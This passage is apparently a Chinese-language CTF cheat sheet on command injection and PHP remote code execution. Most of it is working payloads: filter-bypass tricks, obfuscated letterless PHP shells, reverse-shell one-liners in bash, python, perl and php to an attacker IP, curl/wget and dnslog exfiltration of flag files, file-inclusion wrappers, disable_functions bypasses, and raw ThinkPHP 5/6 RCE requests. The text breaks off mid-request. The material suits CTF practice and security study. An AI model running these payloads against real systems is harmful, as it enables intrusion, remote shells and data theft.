终止进程。<ul><li>kill process_id  # 终止指定进程</li><li>kill -9 process_id  # 强制终止指定进程</li></ul></li><li>df: 显示文件系统的磁盘使用情况。<ul><li>df</li><li>df -h  # 以人类可读的方式显示</li></ul></li><li>du: 显示目录或文件的磁盘使用情况。<ul><li>du -h  # 以人类可读的方式显示</li><li>du -sh directory_name  # 显示目录总大小</li></ul></li><li>ping: 测试网络连接。<ul><li>ping hostname_or_ip</li></ul></li><li>ifconfig: 显示或配置网络接口（需要root权限）。<ul><li>ifconfig</li><li>显示网络连接、路由表、接口状态等</li></ul></li><li>netstat: 显示网络连接、路由表、接口状态等。<ul><li>netstat</li><li>netstat -an  # 显示所有连接</li></ul></li><li>ssh: 通过SSH协议远程登录。<ul><li>ssh user@hostname_or_ip</li><li>通过SSH协议传输文件</li></ul></li><li>scp: 通过SSH协议传输文件。<ul><li>scp local_file user@hostname_or_ip:&#x2F;path&#x2F;to&#x2F;remote_directory</li><li>scp user@hostname_or_ip:&#x2F;path&#x2F;to&#x2F;remote_file local_directory</li></ul></li><li>nc: 建立TCP连接。<ul><li>nc <hostname> <port></li><li>nc localhost 80  # 连接到本地的80端口</li></ul></li><li>nc: 监听TCP端口。<ul><li>nc -l -p <port></li><li>nc -l -p 1234  # 监听本地的1234端口</li></ul></li><li>发送文件：<ul><li>nc <hostname> <port> &lt; <file></li><li>nc remote_host 1234 &lt; file.txt  # 将file.txt发送到远程主机的1234端口</li></ul></li><li>接收文件：<ul><li>nc -l -p <port> &gt; <file></li><li>nc -l -p 1234 &gt; received_file.txt  # 在本地监听1234端口并接收文件到received_file.txt</li></ul></li><li>nc: 端口扫描。<ul><li>nc -zv <hostname> <start_port>-<end_port></li><li>nc -zv localhost 80-100  # 扫描本地的80到100端口</li></ul></li><li>Curl (curl)<ul><li>curl: 下载文件。<ul><li>curl -O <URL></li><li>curl -O <a href="http://example.com/file.txt">http://example.com/file.txt</a>  # 下载一个文件</li></ul></li><li>curl: 上传文件。<ul><li>curl -T <file> <URL></li><li>curl -T file.txt <a href="ftp://ftp.example.com/">ftp://ftp.example.com/</a>  # 将file.txt上传到FTP服务器</li><li>发送GET请求</li></ul></li><li>curl: 发送GET请求。<ul><li>curl <URL></li><li>curl <a href="http://api.example.com/data">http://api.example.com/data</a>  # 发送</li></ul></li></ul></li><li>sh命令会将文件中的内容当作命令来执行</li><li>执行命令时，可以在没有写完的命令后面加\，实现将一条命令多行化，以行末没有\为终止，如下相当于执行了cat flag.txt</li><li>ca\     t f\      lag.\  txt</li><li>linux中,利用rev可将文件内容倒置，同时可以配合&gt;,*使用echo ‘123456’ &gt; test.txt：创建文件 test.txt 并写入内容 123456。</li><li>rev test.txt：反转文件 test.txt 的内容，输出 654321。</li><li>输入 * 并按回车：Shell 将 * 展开为 rev test.txt 并执行，输出 654321。</li><li><ul><li><blockquote><p>a.txt：Shell 将 * 展开为 rev test.txt 并执行，将输出重定向到 a.txt。</p></blockquote></li></ul></li><li>cat a.txt：查看 a.txt 文件的内容，输出 654321。</li><li><blockquote><p>rev：创建一个空文件名为 rev 的文件，如果 rev 文件已经存在，则会清空其内容。</p></blockquote></li><li>linux中,dir命令和ls效果基本一样，只有配合重定向符写入文件时有一些差别，ls写入文件中时，每个文件名都是单独一行，它会自动换行，有时会影响到我们的命令执行，而dir会把内容全部写入一行中，同时会自动补全空格</li></ul></li></ul><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><ul><li>符号<ul><li>;联合执行 </li><li>||或  绕过黑洞</li><li>&amp;&amp;与</li><li>|传到</li><li>?不确定</li><li>*通配</li><li>. &gt;命令会将原有文件内容覆盖，&gt;&gt;会将字符串添加到文件内容末尾，不会覆盖原有的内容</li></ul></li></ul><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><ul><li><p>空格   ${IFS}     $IFS$9     %09 </p><p>​         在env或者printenv环境变量里找空格system(env | grep ‘ ‘)得到MYVAR&#x3D;hello world${MYVAR:5:1} 或者echo@123表示即使123出错也不要报错，echo~123取反  </p></li><li><p>cat过滤</p><ul><li>echo base64命令|base64 -d|sh    </li><li>echo hex命令|xxd -r -p|sh </li><li>换成 fmt more less rev ca\t</li></ul></li><li><p>关键字过滤</p><ul><li>插入反斜线 ca\t     贴贴’c’’a’’t’  ${}拼凑关键词  插入空ca’’t</li><li>对于匹配文件名用通配符[a-s]</li><li>设置变量 cmd&#x3D;ab;a&#x3D;l;b&#x3D;s;$a$b</li></ul></li><li><p>禁用;</p><ul><li>||代替</li></ul></li></ul><h2 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h2><ul><li>preg_replace(‘&#x2F;[a-z]+((?R)?)&#x2F;‘虽然只允许无参数，但是允许函数套用。</li><li>获得flag.php<ul><li>c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}</li><li>c&#x3D;$d&#x3D;opendir(“.”);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d))){echo”$f\n”;}</li><li>c&#x3D;$d&#x3D;dir(“.”);while(false!&#x3D;&#x3D;($f&#x3D;$d-&gt;read())){echo$f.”\n”;}</li><li>print_r(glob(“*”)); &#x2F;&#x2F; 列当前目录</li><li>print_r(glob(“&#x2F;*”)); &#x2F;&#x2F; 列根目录</li><li>scandir(‘.’): &#x2F;&#x2F;获得目录 <ul><li>取出. <ul><li>current(localeconv())</li><li>char(46)&gt;&gt;char(rand())    &#x2F;&#x2F;超多次重放</li><li>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))&#x2F;&#x2F;php7</li></ul></li><li>操作数组：<ul><li>pos() current()第一个元素</li><li>end()- 将内部指针指向数组中的最后一个元素，井输出</li><li>next()- 将内部指针指向数组中的下一个元素，并输出</li><li>prev()- 将内部指针指向数组中的上一个元素，并输出</li><li>reset()- 将内部指针指向敌组中的第一个元素，井输出</li><li>each()— 返回当前元素的键名和键值，井将内部指针向前移动</li></ul></li></ul></li></ul></li><li>取出文件<ul><li>如果flag-php在最后一个，直接用end（）取出即可。</li><li>(1)array_reverse()&#x2F;&#x2F;转置数组<ul><li>仅限于flag.php在数组的倒数第二个位置这种悄况下。</li><li>?exp&#x3D;print_r(next(array_reverse(scandir(pos(localeconv()))))):</li></ul></li><li>(2)array_rand(array_flip()) &#x2F;&#x2F;filp键值互换，rand随机取键<ul><li>flag.php位置在哪都可以，但是他不是100%成功的，需要重放．概率问题</li><li>?exp&#x3D;print_r(array_rand(array_flip(scandir(pos(localeconv())))));</li></ul></li></ul></li><li>session_id(session_star())   更改cookie：PHPSESSID&#x3D;flag.php&#x2F;&#x2F;字符串有长度限制,相当于想写啥就写啥命令不能有空格，因为cookie不解析空格</li><li>end(getallheaders())     &#x2F;&#x2F;得到http包最后字符串，得到任意字符串,甚至可以命令执行，套进system等函数</li><li>取get的最后一个参数       end(pos(get_defined_vars()))       </li><li>取post的最后一个参数      end(next(get_defined_vars()))      记得bp发包<ul><li>读取flag.php<ul><li>文件读取的方法<ul><li>var_dump(file_get_contents())</li><li>show_source()</li><li>highlight_file()</li><li>readfile()</li></ul></li><li>命令执行的方法<ul><li>system(end(next(get_defined_vars())))     post传字符串传入 cat flag.php</li></ul></li></ul></li></ul></li></ul><h2 id="无字母RCE"><a href="#无字母RCE" class="headerlink" title="无字母RCE"></a>无字母RCE</h2><ul><li>php5<ul><li>异或  post传 _&#x3D;phpinfo<ul><li>assert($<em>POST[</em>])</li><li><pre><code class="php">&lt;?php$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;);$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); $___=$$__;$_($___[_]);<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">- 取反  post传   <span class="hljs-number">2</span>=phpinfo<br>  - ```php<br>    <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$__</span>=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$__</span>/<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;的&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;半&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;始&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$_____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;俯&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;次&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;站&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$_____</span>;<span class="hljs-variable">$____</span>(<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]);<br></code></pre></td></tr></table></figure></code></pre></li></ul></li><li>递增运算 post传_&#x3D;phpinfo<ul><li><pre><code class="php">&lt;?php$_=[];$_=@&quot;$_&quot;; $_=$_[&#39;!&#39;==&#39;@&#39;]; $___=$_; $__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; $___.=$__; $__=$_;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$_=$$____;$___($_[_]); <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">- php7<br>  - 取反脚本/异或脚本+动态调用<br>    - 如(<span class="hljs-string">&#x27;phpinfo‘//取反结果)();(&#x27;</span><span class="hljs-keyword">system</span><span class="hljs-comment">//需要变化&#x27;)(ls/ls -la)</span><br>    - ```php<br>      <span class="hljs-symbol">$</span>a=<span class="hljs-string">&#x27;phpinfo&#x27;</span>;<br>      <span class="hljs-symbol">$</span>a();<br></code></pre></td></tr></table></figure></code></pre></li></ul></li></ul></li></ul><h2 id="通过临时文件代码执行"><a href="#通过临时文件代码执行" class="headerlink" title="通过临时文件代码执行"></a>通过临时文件代码执行</h2><ul><li>强制上传表单.php中随便上传,txt文件<ul><li>POST &#x2F;?cmd&#x3D;.+&#x2F;???&#x2F;???????[@-[]? HTTP&#x2F;1.1</li><li>…</li><li>ls &#x2F;</li></ul></li></ul><h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><ul><li>反弹shell<ul><li>nc 43.323.323.2323 4444 -e &#x2F;bin&#x2F;bash    攻击方：nc -lvnp 4444</li><li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;&lt;攻击者IP&gt;&#x2F;4444 0&gt;&amp;1</li><li>python -c ‘import socket,subprocess,os; s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((“&lt;攻击者IP&gt;”,4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p&#x3D;subprocess.call([“&#x2F;bin&#x2F;bash”,”-i”]);’</li><li>perl -e ‘use Socket;$i&#x3D;”&lt;攻击者IP&gt;”;$p&#x3D;4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“&#x2F;bin&#x2F;sh -i”);};’</li><li>php -r ‘$sock&#x3D;fsockopen(“&lt;攻击者IP&gt;”,4444);exec(“&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</li></ul></li><li>curl&#x2F;wget外带数据 :<ul><li>首先在自己的公网ip的网站目录下建立一个record.php的文件，里面写下如下代码：</li><li>开始构造请求（读取不全的话可以进行编码<code>cat flag|base64</code>）：</li><li>curl http:&#x2F;&#x2F;<em>.</em>.*.**&#x2F;record.php?data&#x3D;<code>cat flag|base64</code></li><li>wget http:&#x2F;&#x2F;<em>.</em>.<em>.</em>&#x2F;record.php?data&#x3D;<code>cat flag|base64</code></li><li>执行结果无回显，通过burpsuite的Collaborator 服务器记录，利用<code>curl</code>将执行结果带出来，exp如下</li><li><a href="http://IP:PORT/?cmd=curl%20http://g3k199o7dxxxhsfg6mwal.burpcollaborator.net/?cmd=`cat%20/flag|base64`">http://IP:PORT/?cmd=curl%20http://g3k199o7dxxxhsfg6mwal.burpcollaborator.net/?cmd=`cat%20/flag|base64`</a></li></ul></li><li>dnslog:<ul><li>?cmd&#x3D;<code>sed -n &quot;3.4p&quot;fla?.php|base64</code>;curl ${a:10:30}.&lt;替换的dnslog&gt;</li></ul></li><li>echo写shell或者cat flag &gt; test或者cp flag test等</li><li>我们可以使用$(sleep%091)来测试命令是否成功执行</li><li>可以看到sleep 1，成功的使得页面延时了1秒返回。但是对于$(ls)，我们是无法看到回显的。这是因为使用$(ls)会把ls命令执行的结果作为参数传递给ping，ping将其作为域名进行解析，但是无法得到结果，因此把域名解析失败的错误输出到错误输出中，但php的system函数只输出了标准输出的内容，没有输出标准错误，因为我们无法看到结果。</li><li>我们可以通过重定向标准错误到标准输出中，来让system函数输出错误回显，获取我们注入命令的结果。在sh中，错误描述符的编号是2，因此通过2&gt;&#x2F;dev&#x2F;stdout就可以把错误重定向到标准输出中。</li><li>完整的命令为”$(ls%09&#x2F;)”%092&gt;&#x2F;dev&#x2F;stdout，该命令可以列举根目录的文件。这里双引号的作用是，ls的输出会产生换行，导致ping只会将第一个结果作为错误输出出来，因此套在双引号内部，可以将结果全部回显。</li></ul><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><ul><li>eval($c)&#x2F;&#x2F;eval(“var_dump($code)”);类似于这种注意闭合<ul><li>查看当前目录<ul><li>c&#x3D;print_r(scandir(dirname(‘<strong>FILE</strong>‘)));</li><li>print_r(scandir(dirname(<strong>FILE</strong>)));</li><li>c&#x3D;system(“ls”);</li></ul></li><li>再看根<ul><li>c&#x3D;print_r(scandir(‘&#x2F;‘));</li><li>c&#x3D;var_export(scandir(‘&#x2F;‘));</li><li>c&#x3D;var_dump(glob(‘&#x2F;*’));</li><li>c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}die(); &#x2F;&#x2F;有open_basedir限制</li></ul></li><li>读取flag<ul><li>?c&#x3D;system($_GET[‘a’]);&amp;a&#x3D;cat flag.php;</li><li>?c&#x3D;echo <code>cat fl&#39;&#39;ag.php</code>;</li><li>?c&#x3D;highlight_file(next(array_reverse(scandir(“.”))));</li><li>?c&#x3D;eval(end(current(get_defined_vars())));&amp;a&#x3D;system(“cat flag.php”);</li><li>?c&#x3D;passthru(‘cat &#x2F;flag_is_her3’);</li><li>?c&#x3D;a&#x3D;g;cat$IFS$1fla$a.php</li><li>?c&#x3D;system(“cat fl*g.php”);</li><li>?c&#x3D;system(“tac fl*g.php”);</li><li>?c&#x3D;print_r(file(‘flag.php’));</li><li>?c&#x3D;var_dump(file(‘flag.php’));</li><li>?%20num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))  &#x2F;&#x2F;对应char脚本</li><li>?c&#x3D;exec(%27cat%20&#x2F;flag_is_her3%27,$array);var_dump($array);</li><li>?c&#x3D;readfile(“flag.php”);</li><li>?c&#x3D;$a&#x3D;fopen(“flag.php”,”r”);while (!feof($a)) {$line &#x3D; fgets($a);echo $line;}        &#x2F;&#x2F;一行一行读取</li><li>?c&#x3D;$a&#x3D;fopen(“flag.php”,”r”);while (!feof($a)) {$line &#x3D; fgetc($a);echo $line;} &#x2F;&#x2F;一个一个字符读取</li><li>?c&#x3D;$a&#x3D;fopen(“flag.php”,”r”);while (!feof($a)) {$line &#x3D; fgetcsv($a);var_dump($line);}</li><li>?c&#x3D;system(“cp fl*g.php a.txt “); 访问&#x2F;a.txt</li><li>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system('tac%20f*');?></li><li>?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('ls /');?></li><li>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs&#x2F;Pg&#x3D;&#x3D;       &#x2F;&#x2F;(<?php system("tac flag.php");?>)</li><li>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</li><li>?c&#x3D;&#x2F;bin&#x2F;ca?${IFS}f???????</li><li>?c&#x3D;&#x2F;???&#x2F;????64%20????.???  # &#x2F;bin&#x2F;base64 flag.php</li><li>?c&#x3D;&#x2F;???&#x2F;???&#x2F;????2 ????????  # &#x2F;usr&#x2F;bin&#x2F;bzip2 flag.php</li><li>?c&#x3D;$a&#x3D;fopen(“flag.php”,”r”);while($b&#x3D;fgets($a)){echo $b;}</li><li>?c&#x3D;system(‘echo -e “ &lt;?php \n error_reporting(0); \n  $c&#x3D; $_GET[&#39;c&#39;]; \n eval($c); “ &gt; a.php’);  访问&#x2F;a.php?c&#x3D;system(“tac flag.php”);</li><li>?c&#x3D;system(“cat fl*g.php | grep  -E ‘fl.g’ “);</li></ul></li><li>无所谓，文件包含会出手<ul><li>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php  &#x2F;&#x2F;不用分号</li><li>GET：?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;input</li><li>POST：<?php system('tac flag.php');?></li><li>c&#x3D;include(‘flag.php’);echo $flag;</li><li>c&#x3D;include($_GET[‘1’]); ?1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</li><li>c&#x3D;include(‘flag.php’);var_dump(get_defined_vars());&#x2F;&#x2F;var_dump:输出注册变量&#x2F;&#x2F;get_defined_vars():函数返回由所有已定义变量所组成的数组</li><li>c&#x3D;include(‘&#x2F;flag.txt’);var_export(get_defined_vars());</li><li>c&#x3D;include(“&#x2F;flag.txt”);$ss&#x3D;ob_get_contents();ob_end_clean();echo $ss;</li><li>c&#x3D;include(‘&#x2F;flag.txt’);var_export(get_defined_vars());exit();</li><li>或者</li><li>c&#x3D;include(‘&#x2F;flag.txt’);var_export(get_defined_vars());die();</li><li>c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}die();</li><li>或者</li><li>c&#x3D;var_export(glob(‘&#x2F;*’));die();</li></ul></li><li><code>include &quot;flag.php&quot;;</code>，这里面应该有flag变量，用<a href="https://www.runoob.com/php/php-get_defined_vars-function.html">get_defined_vars()</a> 函数+var_dump全部输出出来。<ul><li>var_dump(get_defined_vars());</li></ul></li></ul></li></ul><h2 id="system"><a href="#system" class="headerlink" title="system();"></a>system();</h2><ul><li>tac \find &#x2F; -inum 3673632<ul><li>printf &#x2F;fla &gt; &#x2F;tmp&#x2F;zer0b</li><li>printf g &gt;&gt; &#x2F;tmp&#x2F;zer0b</li><li>tac `tac &#x2F;tmp&#x2F;zer0b</li><li>利用bashfuck直接跑</li></ul></li></ul><h2 id="fuzzshell"><a href="#fuzzshell" class="headerlink" title="fuzzshell"></a>fuzzshell</h2><p>1.第一行为输入命令，文件地址，或者其他数据2.第二行为黑名单，用 “,” 隔开如： flag,eval,cat,system ，然后点击黑名单，会清除输出中存在黑名单的数据3.然后点击去重。4.点击复制后导入到burpsuite进行fuzz            问题是占资源该超频了</p><ul><li>命令混淆： 对linux命令进行简单的混淆</li><li>读文件+混淆： 不需要输入命令，输入文件的地址即可如&#x2F;flag (或者&#x2F;f* &#x2F;f???)</li><li>读文件：只输出一些能查看文件的命令不进行混淆</li><li>php读文件：题目环境存在include()文件包含的情况下使用</li><li>php代码执行：题目环境中存在eval()等情况下使用</li><li>八进制编码：</li><li>十六进制编码：</li><li>IP编码：ipv4地址编码，SSRF使用</li><li>命令混淆： 对linux命令进行简单的混淆</li><li>读文件+混淆： 不需要输入命令，输入文件的地址即可如&#x2F;flag (或者&#x2F;f* &#x2F;f???)</li><li>读文件：只输出一些能查看文件的命令不进行混淆</li><li>php读文件：题目环境存在include()文件包含的情况下使用</li><li>php代码执行：题目环境中存在eval()等情况下使用</li><li>八进制编码：</li><li>十六进制编码：</li><li>IP编码：ipv4地址编码，SSRF使用</li></ul><h2 id="补充：封装协议的利用"><a href="#补充：封装协议的利用" class="headerlink" title="补充：封装协议的利用"></a>补充：封装协议的利用</h2><ul><li>fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数stream_wrapper_register() </li><li>php:&#x2F;&#x2F;input   allow_url_include选项必须设置为on，否则无法成功,allow_url_fopen是否开启无关紧要。php:&#x2F;&#x2F;input是用来接收post数据的当enctype&#x3D;”multipart&#x2F;form-data”的时候php:&#x2F;&#x2F;input是无效php:&#x2F;&#x2F;input 用于 application&#x2F;x-www-form-urlencoded 或 text&#x2F;plain 编码类型的表单数据。<ul><li>例子：文件包含</li></ul></li><li>data:&#x2F;&#x2F;       allow_url_include与allow_url_fopen选项必须设置为on<ul><li>用法：<ul><li>data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo()?></li><li>data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</li><li>或者：</li><li>data:text&#x2F;plain,<?php phpinfo()?></li><li>data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</li></ul></li></ul></li></ul><h2 id="disable-functions是php-ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数"><a href="#disable-functions是php-ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数" class="headerlink" title="disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数"></a>disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数</h2><ul><li>为了安全,运维人员会禁用PHP的一些“危险”函数,将其写在php.ini配置文件中,就是我们所说的disable_functions了。</li><li>disable_functions是一个黑名单机制，如果在渗透时已经上传了webshell却因为disable_functions导致我们无法进行命令执行，这时候就需要去进行一个绕过。</li></ul><h3 id="disable-functions"><a href="#disable-functions" class="headerlink" title="disable_functions"></a>disable_functions</h3><ul><li>PoC<ul><li>禁用了常见的命令执行函数如system、exec、passthru但不能禁用所有函数（例如，如果禁用了stream_filter_register或类似函数，这个PoC可能无法执行）。</li><li>PoC主要针对Unix-like系统（Linux、macOS等），因为它依赖于底层的内存管理特性，这在不同操作系统之间可能有所不同。</li><li>没有启用诸如open_basedir等限制性配置</li><li>没有启用safe_mode（虽然safe_mode在PHP 5.4中被移除，但在某些环境中仍可能会影响漏洞利用）。</li><li>服务器配置允许使用php:&#x2F;&#x2F;memory等流包装器。</li><li>上传PoC.php最后访问PoC.php获取flag</li></ul></li></ul><h3 id="利用-LD-PRELOAD突破"><a href="#利用-LD-PRELOAD突破" class="headerlink" title="利用[LD_PRELOAD突破"></a>利用[LD_PRELOAD突破</h3><ul><li>找到“绕过disable_funtions“，在刚刚连接上的shell右键-&gt;加载插件-&gt;辅助工具-&gt;绕过disable_functions。模式选择<code>PHP7_GC_UAF</code>再点击开始，就能执行命令了</li></ul><h3 id="利用Windows组件COM绕过"><a href="#利用Windows组件COM绕过" class="headerlink" title="利用Windows组件COM绕过"></a>利用Windows组件COM绕过</h3><ul><li>查看com.allow_dcom是否开启,这个默认是不开启的。</li><li>上传 EXP 脚本</li><li><a href="http://target.com/uploads/com.php%EF%BC%9Fcmd=whoami">http://target.com/uploads/com.php？cmd=whoami</a></li></ul><h3 id="利用PHP7-4-FFI绕过"><a href="#利用PHP7-4-FFI绕过" class="headerlink" title="利用PHP7.4 FFI绕过"></a>利用PHP7.4 FFI绕过</h3><h3 id="ThinkPHP-5-的远程代码执行（RCE）"><a href="#ThinkPHP-5-的远程代码执行（RCE）" class="headerlink" title="ThinkPHP 5 的远程代码执行（RCE）"></a>ThinkPHP 5 的远程代码执行（RCE）</h3><ul><li>POST &#x2F;index.php?s&#x3D;captcha HTTP&#x2F;1.1</li><li>Host: IP:PORT</li><li>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0</li><li>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8</li><li>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</li><li>Accept-Encoding: gzip, deflate</li><li>Connection: close</li><li>Upgrade-Insecure-Requests: 1</li><li>Pragma: no-cache</li><li>Cache-Control: no-cache</li><li>Content-Type: application&#x2F;x-www-form-urlencoded</li><li>Content-Length: 79<ul><li>_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag</li></ul></li></ul><h3 id="tp6rce"><a href="#tp6rce" class="headerlink" title="tp6rce"></a>tp6rce</h3><ul><li>@Session::set(‘user’,$_GET[‘username’]);</li><li>访问会看到session设置，构造数据包如下</li><li>GET &#x2F;public&#x2F;index.php?username&#x3D;<?php+eval($_GET[1]);?> HTTP&#x2F;1.1</li><li>Host: IP:PORT</li><li>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0</li><li>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8</li><li>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</li><li>Accept-Encoding: gzip, deflate</li><li>Connection: close</li><li>Cookie: 